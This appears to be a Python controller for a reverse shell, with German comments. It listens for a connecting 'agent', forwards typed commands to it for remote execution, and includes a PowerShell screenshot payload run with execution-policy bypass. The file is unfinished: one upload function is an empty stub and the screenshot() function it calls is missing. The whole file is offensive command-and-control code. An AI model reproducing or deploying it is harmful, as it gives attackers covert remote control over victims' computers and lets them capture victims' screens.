import socket
import os
import threading
import time

showData = False

def listening():
    while True:
        data = clientsock.recv(65500)
        if showData == True:
            # print(data.decode())
            try:
                # Versuche, die Daten mit UTF-8 zu dekodieren
                print(data.decode('utf-8'))
            except UnicodeDecodeError:
                # Wenn UTF-8 fehlschlägt, verwende eine alternative Kodierung wie cp1252
                print(data.decode('cp1252', errors='replace'))
        
def showHelp():
    print('''
          Installierte Commands:
          
          Die ReverseShell ist automatisch nach der Verbindung geöffnet. Jedes Kommando wird direkt vom Agent empfangen.
          Teste es mit 'whoami'. 
          
          [screen] - Screenshot
          [exit] - Schließen
          [help] - Hilfe öffnen
          
          ''')
    
    
    
def upload_screenshot(screenshot_path):
    url = "http://127.0.0.1:5000/upload" 
    #mit Curl hochladen
    


    

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 4422)
    print(f"Starting up on {server_address}")
    sock.bind(server_address)
    sock.listen(1)

    clientsock, (ip,port) = sock.accept()
    print(f"[+] New Agent connect from {ip}:{port}")
    threading.Thread(target=listening).start()
    
    CMDCODE = r'''
powershell.exe -W Normal -nop -ep bypass -C ^

$ScreenWidth = "Get-WmiObject -Class Win32_DesktopMonitor | Select-Object -ExpandProperty ScreenWidth"; ^

echo $ScreenWidth; ^

$ScreenHeight = "Get-WmiObject -Class Win32_DesktopMonitor | Select-Object -ExpandProperty ScreenHeight"; ^

echo $ScreenHeight; ^

"[Reflection.Assembly]::LoadWithPartialName('System.Drawing')";^

"function screenshot([Drawing.Rectangle]$bounds, $path) {$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size); $bmp.Save($path); $graphics.Dispose(); $bmp.Dispose()}";^

$bounds = "[Drawing.Rectangle]::FromLTRB(0, 0, $ScreenWidth, $ScreenHeight)";^

screenshot $bounds "C:\Users\admin\Desktop\screenshot.png";'''
    
    while True:
        
        #try:
        #    data = clientsock.recv(65500)
        #    if data:
        #        print("Hier: " + data.decode())
        #except ConnectionResetError:
        #    print(f"\nConnection with {ip}:{port} lost.")
        
        
        command = input("Command:")
        showData = True
        if command.lower() == "exit":
            sock.close()
            print("Verbindung wird geschlossen.")
            break
        elif command.lower() == "help":
            showHelp()
            continue
        elif command.lower() == "screen":
            screenshot()
        elif command.lower() == "test":
            clientsock.send("cd".encode())
            time.sleep(2)
            clientsock.send(CMDCODE.encode())   
            continue        
        
            
        
        clientsock.send(command.encode())
        
        
    
    

